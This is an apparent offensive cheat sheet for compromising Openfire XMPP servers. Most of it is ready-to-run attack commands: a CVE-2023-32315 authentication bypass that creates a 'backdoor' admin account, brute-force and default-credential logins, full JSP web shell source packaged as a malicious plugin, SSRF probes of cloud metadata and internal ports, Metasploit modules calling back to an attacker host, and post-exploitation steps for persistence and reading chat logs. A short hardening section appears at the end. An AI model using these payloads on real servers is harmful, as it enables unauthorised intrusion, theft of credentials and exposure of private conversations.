# OPENFIRE ENUMERATION (Port 9090)

## SERVICE OVERVIEW
```
Openfire is an XMPP (Jabber) server for instant messaging
- Default admin port: 9090 (HTTP)
- HTTPS admin: 9091
- XMPP client: 5222
- XMPP server: 5269
- File transfer: 7777
- Open-source instant messaging server
- Multiple known vulnerabilities
```

## BANNER GRABBING & VERSION DETECTION
```bash
nmap -sV -p9090 <IP>                             # Service/Version detection
curl -I http://<IP>:9090                         # HTTP headers
curl http://<IP>:9090 | grep -i "openfire\|version"
nc -nv <IP> 9090                                 # Manual connection
```

## OPENFIRE DETECTION
```bash
# Detect Openfire
curl http://<IP>:9090 | grep -i openfire
curl -I http://<IP>:9090 | grep -i server

# Openfire admin console
curl http://<IP>:9090/                           # Login page
curl http://<IP>:9090/login.jsp                  # Login form
curl http://<IP>:9090/setup/index.jsp            # Setup wizard (if not configured)

# Version detection
curl http://<IP>:9090 | grep -oP 'Openfire [0-9]+\.[0-9]+'
nmap -sV -p9090 <IP> | grep -i openfire
```

## SETUP WIZARD EXPLOITATION
```bash
# If Openfire is not configured, setup wizard is accessible!
curl http://<IP>:9090/setup/index.jsp

# Check setup status
curl http://<IP>:9090/setup/setup-completed.jsp

# If setup not completed:
# 1. Access http://<IP>:9090/setup/index.jsp
# 2. Complete setup wizard
# 3. Set admin credentials
# 4. Get full admin access!

# This is a critical misconfiguration!
```

## DEFAULT CREDENTIALS
```bash
# Common Openfire default credentials
admin:admin
admin:password
admin:openfire
openfire:openfire

# Test login
curl -d "url=%2Findex.jsp&login=true&username=admin&password=admin" http://<IP>:9090/login.jsp -L

# After login, you'll receive a session cookie
```

## BRUTE FORCE ATTACKS
```bash
# Hydra
hydra -l admin -P passwords.txt -s 9090 <IP> http-form-post "/login.jsp:url=%2Findex.jsp&login=true&username=^USER^&password=^PASS^:F=Login failed"

# Custom script
for pass in admin password openfire 123456; do
    echo "Testing: admin:$pass"
    curl -c cookies.txt -d "url=%2Findex.jsp&login=true&username=admin&password=$pass" http://<IP>:9090/login.jsp -L | grep -q "Openfire Admin Console" && echo "[+] Valid: admin:$pass"
done
```

## VULNERABILITY SCANNING
```bash
# Search for Openfire exploits
searchsploit openfire

# Known Openfire CVEs:
# CVE-2023-32315: Path traversal (authentication bypass)
# CVE-2019-18394: SSRF vulnerability
# CVE-2015-6973: Authentication bypass
# CVE-2008-6508: Multiple XSS
# CVE-2009-0496: Directory traversal

nmap -p9090 --script vuln <IP>
```

## CVE-2023-32315 (PATH TRAVERSAL AUTH BYPASS)
```bash
# Critical authentication bypass vulnerability
# Affects Openfire < 4.6.8, < 4.7.5

# Test for vulnerability
curl "http://<IP>:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp"

# If vulnerable, access admin pages without authentication!

# Access admin console
curl "http://<IP>:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/index.jsp"

# Create admin user
curl -X POST "http://<IP>:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp" \
  -d "username=backdoor&password=password123&passwordConfirm=password123&email=backdoor@test.com&isAdmin=true"

# Metasploit
msfconsole
use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
set RHOSTS <IP>
set RPORT 9090
set LHOST <attacker_IP>
check
exploit
```

## AUTHENTICATED RCE (PLUGIN UPLOAD)
```bash
# After successful login, upload malicious plugin for RCE

# Method 1: Via admin console
# 1. Login to http://<IP>:9090
# 2. Navigate to Plugins
# 3. Upload plugin
# 4. Malicious plugin executes code

# Method 2: Craft malicious plugin JAR
# Create plugin with JSP web shell
# Package as .jar file
# Upload via admin console

# Metasploit (authenticated RCE)
use exploit/multi/http/openfire_plugin_exec
set RHOSTS <IP>
set RPORT 9090
set USERNAME admin
set PASSWORD admin
set LHOST <attacker_IP>
exploit
```

## CREATE MALICIOUS OPENFIRE PLUGIN
```bash
# Openfire plugin structure:
# plugin.jar
#   ├── plugin.xml (metadata)
#   ├── lib/ (libraries)
#   └── web/ (web resources, can contain JSP shell)

# Create simple plugin with web shell
mkdir -p myplugin/web
echo '<%@ page import="java.io.*" %>
<% String cmd = request.getParameter("cmd");
   Process p = Runtime.getRuntime().exec(cmd);
   InputStream in = p.getInputStream();
   BufferedReader reader = new BufferedReader(new InputStreamReader(in));
   String line;
   while ((line = reader.readLine()) != null) { out.println(line); }
%>' > myplugin/web/shell.jsp

# Create plugin.xml
echo '<?xml version="1.0" encoding="UTF-8"?>
<plugin>
    <class>org.example.MyPlugin</class>
    <name>My Plugin</name>
    <description>Test Plugin</description>
    <author>Tester</author>
    <version>1.0</version>
    <minServerVersion>3.0.0</minServerVersion>
</plugin>' > myplugin/plugin.xml

# Package as JAR
cd myplugin && jar cvf ../myplugin.jar *

# Upload myplugin.jar via admin console
# Access shell: http://<IP>:9090/plugins/myplugin/shell.jsp?cmd=whoami
```

## XMPP ENUMERATION
```bash
# XMPP runs on port 5222 (client-to-server)
nmap -sV -p5222 <IP>

# Connect to XMPP
telnet <IP> 5222

# XMPP user enumeration
# Use tools like:
- Metasploit: auxiliary/scanner/xmpp/xmpp_login
- manual XML stanzas

# XMPP brute force
hydra -L users.txt -P passwords.txt xmpp://<IP>
```

## METASPLOIT MODULES
```bash
msfconsole
use auxiliary/scanner/http/openfire_login        # Login scanner
use exploit/multi/http/openfire_auth_bypass      # Auth bypass
use exploit/multi/http/openfire_plugin_exec      # Authenticated RCE
use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315  # CVE-2023-32315
set RHOSTS <IP>
set RPORT 9090
run
```

## DIRECTORY ENUMERATION
```bash
# Common Openfire paths
/                                                # Login page
/login.jsp                                       # Login form
/setup/index.jsp                                 # Setup wizard
/plugins/                                        # Plugins directory
/plugin-admin.jsp                                # Plugin admin
/user-summary.jsp                                # User summary
/group-summary.jsp                               # Group summary
/server-properties.jsp                           # Server properties
/system-log.jsp                                  # System logs

# Directory brute forcing
gobuster dir -u http://<IP>:9090 -w /usr/share/wordlists/dirb/common.txt
```

## INFORMATION DISCLOSURE
```bash
# Version disclosure
curl http://<IP>:9090 | grep -i "version\|openfire"

# Server information
curl http://<IP>:9090/server-properties.jsp      # Requires auth

# Logs (may contain sensitive info)
curl http://<IP>:9090/system-log.jsp             # Requires auth

# Error messages
curl http://<IP>:9090/nonexistent                # May reveal paths
```

## SSRF (CVE-2019-18394)
```bash
# Server-side request forgery vulnerability

# Exploit SSRF to access internal services
curl "http://<IP>:9090/getFavicon?host=localhost:22"
curl "http://<IP>:9090/getFavicon?host=169.254.169.254/latest/meta-data/"  # AWS metadata

# Use SSRF to scan internal network
for port in 22 80 443 3306 5432; do
    echo "Testing port $port"
    curl "http://<IP>:9090/getFavicon?host=127.0.0.1:$port"
done
```

## COMMON MISCONFIGURATIONS
```
☐ Setup wizard accessible (not configured)       # Critical - full admin access
☐ Default credentials (admin:admin)              # Easy access
☐ Admin console exposed to internet              # Should be internal only
☐ Outdated version with known CVEs               # Authentication bypass, RCE
☐ No IP restrictions                             # Anyone can access
☐ Plugin uploads enabled                         # RCE vector
☐ XMPP ports exposed                             # Additional attack surface
☐ Weak SSL/TLS (if using 9091)                   # Cryptographic attacks
```

## QUICK WIN CHECKLIST
```
☐ Check if setup wizard is accessible
☐ Test default credentials (admin:admin)
☐ Test CVE-2023-32315 (path traversal auth bypass)
☐ Test CVE-2019-18394 (SSRF)
☐ Brute force admin credentials
☐ Check Openfire version
☐ Test plugin upload (if authenticated)
☐ Enumerate XMPP users (port 5222)
☐ Look for exposed logs
☐ Search for version-specific exploits
```

## ONE-LINER FULL ENUMERATION
```bash
# Comprehensive Openfire scan
nmap -sV -p9090,9091,5222,5269 --script "http-* and xmpp-*" -oA openfire_enum <IP>

# Quick setup wizard check
curl -s http://<IP>:9090/setup/index.jsp | grep -i "setup"

# CVE-2023-32315 test
curl -s "http://<IP>:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/index.jsp" | grep -i "Openfire"
```

## POST-EXPLOITATION (After Admin Access)
```bash
# 1. Upload malicious plugin
# Deploy JAR with web shell

# 2. Create backdoor admin account
# Via admin console: Server -> Users -> Create User
# Set as admin

# 3. Extract database credentials
# Openfire stores data in embedded or external DB
# Check openfire.xml for DB credentials

# 4. Access chat logs
# Openfire can log all XMPP conversations
# Navigate to Archives (if enabled)

# 5. User enumeration
# Extract all registered XMPP users
# Potentially use for password spraying

# 6. Persistence
# Upload backdoor plugin
# Create multiple admin accounts
# Modify server configuration
```

## OPENFIRE CONFIGURATION FILES
```bash
# Important Openfire files
/opt/openfire/conf/openfire.xml                  # Main configuration
/opt/openfire/plugins/                           # Plugins directory
/opt/openfire/logs/                              # Log files
/var/lib/openfire/embedded-db/                   # Embedded database (if used)

# Windows locations:
C:\Program Files\Openfire\conf\openfire.xml
C:\Program Files\Openfire\plugins\
C:\Program Files\Openfire\logs\
```

## SECURITY IMPLICATIONS
```
CRITICAL RISKS:
1. Setup wizard accessible = instant admin
2. Authentication bypass vulnerabilities
3. Plugin upload = RCE
4. Default credentials common
5. SSRF vulnerabilities
6. Access to all instant messages
7. User credentials stored
8. Often exposed to internet
9. Can pivot to XMPP network

RECOMMENDATION:
- Complete setup wizard immediately after installation
- Change default credentials
- Restrict admin console to internal network/VPN
- Update to latest version
- Disable plugin uploads if not needed
- Use firewall to block ports 9090/9091
- Enable XMPP encryption (TLS)
- Regular security audits
- Monitor for suspicious plugins
```

## OPENFIRE PORT MAPPING
```
Common Openfire ports:
9090 - Admin console (HTTP)
9091 - Admin console (HTTPS)
5222 - XMPP client connections
5223 - XMPP client (legacy SSL)
5269 - XMPP server-to-server
5270 - XMPP server (legacy SSL)
5275 - XMPP external component
5276 - XMPP external component (SSL)
7070 - HTTP binding (BOSH)
7443 - HTTP binding (BOSH, HTTPS)
7777 - File transfer proxy
9094 - Flash cross-domain policy
```
